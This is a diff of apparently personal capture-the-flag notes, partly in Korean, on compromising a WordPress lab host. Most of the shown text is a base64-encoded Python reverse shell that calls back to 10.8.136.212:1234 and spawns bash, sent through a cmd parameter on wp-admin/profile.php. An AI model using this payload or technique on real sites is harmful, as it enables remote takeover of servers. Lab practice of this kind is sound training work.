@@ -518,8 +518,16 @@ VCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoMTAuOC4xMzYuMjEyLDEyMzQpKTtvcy5k
 dXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5v
 KCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKC9iaW4vYmFzaCk=
 
-# fail -> maybe directory listing...?
+# fail -> maybe directory listing...? -> 분명히 플러그인이 취약점인데..!
 
 No such file or directory
 bash: VCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoMTAuOC4xMzYuMjEyLDEyMzQpKTtvcy5k: command not found
 bash: dXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5v: command not found
+
+# http://www.smol.thm/wp-admin/index.php -> 관리자 페이지 전체에서 플러그인 사용하는 것 확인
+
+![](https://velog.velcdn.com/images/agnusdei1207/post/203b4452-c71a-414a-b29c-86e95d1b2a8f/image.png)
+
+# second Attempt payload -> 403 ? -> reverse shell gogo!
+
+http://www.smol.thm/wp-admin/profile.php?cmd=aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoMTAuOC4xMzYuMjEyLDEyMzQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKC9iaW4vYmFzaCk=
